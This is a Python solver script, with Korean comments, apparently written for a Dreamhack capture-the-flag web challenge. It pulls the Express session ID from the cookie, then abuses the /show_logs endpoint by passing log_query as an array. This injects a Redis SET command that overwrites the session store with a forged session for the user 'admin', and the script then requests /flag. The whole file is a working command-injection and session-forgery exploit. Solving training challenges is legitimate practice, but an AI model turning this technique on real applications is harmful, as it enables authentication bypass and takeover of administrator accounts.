import requests
import urllib.parse

# 문제 서버 주소
TARGET_URL = "http://host3.dreamhack.games:18617"

def solve():
    # 1. 세션 생성 (접속 시도)
    s = requests.Session()
    s.get(TARGET_URL)
    
    # 2. 쿠키에서 세션 ID 추출
    # connect.sid 형식: s%3A<SessionID>.<Signature>
    # URL Decode 후 's:' 뒤, '.' 앞부분이 실제 Redis Key에 사용되는 Session ID임
    if 'connect.sid' not in s.cookies:
        print("[-] 세션 쿠키를 찾을 수 없습니다.")
        return

    connect_sid = urllib.parse.unquote(s.cookies['connect.sid'])
    # "s:아이디.서명" 형태에서 아이디만 추출
    session_id = connect_sid.split(':')[1].split('.')[0]
    redis_key = f"sess:{session_id}"
    
    print(f"[+] Session ID: {session_id}")
    print(f"[+] Target Redis Key: {redis_key}")

    # 3. 조작할 세션 데이터 (JSON)
    # userid를 "admin"으로 설정
    malicious_session_data = '{"cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"},"userid":"admin"}'

    # 4. Redis Command Injection 공격 수행
    # log_query를 배열로 전달하여 split() 에러 유발 -> catch 블록 진입 -> send_command 실행
    # redis_client.send_command('SET', ['sess:ID', 'DATA'], cb) 형태로 실행되도록 구성
    params = {
        "log_query[0]": "SET",          # 명령어
        "log_query[1][0]": redis_key,   # 인자 1: 키
        "log_query[1][1]": malicious_session_data # 인자 2: 값
    }

    print("[+] Sending exploit payload...")
    res = s.get(f"{TARGET_URL}/show_logs", params=params)
    
    # 5. 플래그 확인
    print("[+] Checking flag...")
    res = s.get(f"{TARGET_URL}/flag")
    
    if "DH{" in res.text:
        print(f"\n[SUCCESS] Flag: {res.text}")
    else:
        print(f"\n[FAIL] Response: {res.text}")

if __name__ == "__main__":
    solve()